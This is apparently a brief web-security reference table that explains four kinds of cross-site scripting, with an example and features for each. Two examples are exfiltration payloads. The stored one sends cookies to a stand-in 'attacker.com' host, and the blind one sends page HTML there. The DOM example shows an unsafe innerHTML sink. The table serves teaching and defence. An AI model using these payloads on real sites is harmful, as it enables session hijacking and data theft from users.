XSS Vulnerability Types

XSS Type Description Example Key Features
Reflected XSS Also known as Non-Persistent XSS, occurs when malicious script is reflected off a web server in a response. https://target.com/search?q=<script>alert('XSS')</script>
  • Instant execution
  • No server storage
  • URL-based injection
  • Easy to detect
Stored XSS Also known as Persistent XSS, occurs when malicious script is stored on the target server. <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
  • Persistent attack
  • Affects all users
  • Comment sections
  • User profiles
DOM-based XSS Occurs when the vulnerability exists in client-side code rather than server-side code. document.getElementById('content').innerHTML = userInput;
  • Client-side execution
  • No server interaction
  • JavaScript-based
  • Harder to detect
Blind XSS A variant of stored XSS where the malicious payload is stored but executed in a different context. <script>fetch('http://attacker.com/log?data='+btoa(document.documentElement.outerHTML))</script>
  • Delayed execution
  • Admin panels
  • Log viewers
  • Email systems
